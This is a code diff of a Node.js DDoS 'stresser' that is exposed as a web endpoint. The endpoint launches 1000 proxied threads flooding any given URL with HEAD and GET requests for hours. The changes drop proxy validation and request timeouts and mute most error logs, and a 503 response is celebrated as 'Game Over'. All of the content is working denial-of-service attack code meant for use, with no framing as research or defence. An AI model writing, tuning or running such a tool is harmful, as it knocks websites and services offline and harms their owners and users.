@@ -14,7 +14,6 @@ const stateFilePath = path.join(__dirname, 'attackState.json');
 // Configuration
 const REQUESTS_PER_THREAD = 2; // Number of requests per thread per batch
 const numThreads = 1000; // Number of threads
-const REQUEST_TIMEOUT = 5000; // Timeout for requests in milliseconds
 let totalRequestsSent = 0; // Counter for total successful requests
 let batchDurations = []; // Array to store batch durations for dynamic estimation
 
@@ -116,22 +115,9 @@ const userAgents = () => {
 
 const loadProxies = () => {
     try {
-        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim()).filter(line => line);
+        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
     } catch {
         return [];
-    }
-};
-
-const validateProxy = async (proxy) => {
-    try {
-        const proxyParts = proxy.split(":");
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
-        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
-        await axios.get("https://httpbin.org/ip", { httpAgent: agent, timeout: 5000 });
-        return true;
-    } catch {
-        return false;
     }
 };
 
@@ -186,8 +172,8 @@ const performAttack = async (url, agent, threadId) => {
 
     // Create an array of REQUESTS_PER_THREAD HEAD and GET requests
     const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
-        axios.head(url, { httpAgent: agent, headers: headersForRequest, timeout: REQUEST_TIMEOUT }),
-        axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: REQUEST_TIMEOUT })
+        axios.head(url, { httpAgent: agent, headers: headersForRequest }),
+        axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
     ]).flat();
 
     const batchStartTime = Date.now();
@@ -195,16 +181,21 @@ const performAttack = async (url, agent, threadId) => {
     try {
         // Send all requests simultaneously
         const results = await Promise.allSettled(requests.map(request => request.catch(err => {
-            let errorMessage = `Thread ${threadId}: Request failed`;
-            if (err.code) {
-                errorMessage += ` with code ${err.code}`;
+            if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+                // console.log(rainbow(`Thread ${threadId}: Unable to Attack Target Server Refused!`));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow(`Thread ${threadId}: Target returned 404 (Not Found).`));
+            } else if (err.response?.status === 503) {
+                console.log(rainbow(`Thread ${threadId}: Target under heavy load (503) - Game Over!`));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow(`Thread ${threadId}: Bad Gateway (502).`));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow(`Thread ${threadId}: Forbidden (403).`));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`Thread ${threadId}: DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(`Thread ${threadId}: ${err.message || "ATTACK FAILED!"}`));
             }
-            if (err.response?.status) {
-                errorMessage += ` with status ${err.response.status}`;
-            } else if (err.message) {
-                errorMessage += `: ${err.message}`;
-            }
-            console.log(rainbow(errorMessage));
             return null; // Return null for failed requests
         })));
 
@@ -232,7 +223,7 @@ const performAttack = async (url, agent, threadId) => {
     }
 };
 
-const startAttack = async (url, durationHours) => {
+const startAttack = (url, durationHours) => {
     if (!url || !/^https?:\/\//.test(url)) {
         console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
         return false;
@@ -243,20 +234,6 @@ const startAttack = async (url, durationHours) => {
         console.error("No proxies found. Please add proxies to the proxy file.");
         return false;
     }
-
-    // Validate proxies
-    console.log(rainbow("Validating proxies..."));
-    const validProxies = [];
-    for (const proxy of proxies) {
-        if (await validateProxy(proxy)) {
-            validProxies.push(proxy);
-        }
-    }
-    if (!validProxies.length) {
-        console.error("No valid proxies found. Please update proxy.txt with working proxies.");
-        return false;
-    }
-    console.log(rainbow(`${validProxies.length} valid proxies found.`));
 
     continueAttack = true;
     targetUrl = url;
@@ -293,7 +270,7 @@ const startAttack = async (url, durationHours) => {
     for (let i = 0; i < numThreads; i++) {
         if (!continueAttack) break;
 
-        const randomProxy = getRandomElement(validProxies);
+        const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
         const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
@@ -304,7 +281,7 @@ const startAttack = async (url, durationHours) => {
     return true;
 };
 
-app.get("/stresser", async (req, res) => {
+app.get("/stresser", (req, res) => {
     const url = req.query.url;
     const durationHours = parseFloat(req.query.duration) || 1;
 
@@ -315,7 +292,7 @@ app.get("/stresser", async (req, res) => {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
 
-    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
+    res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
     startAttack(url, durationHours);
 });
 
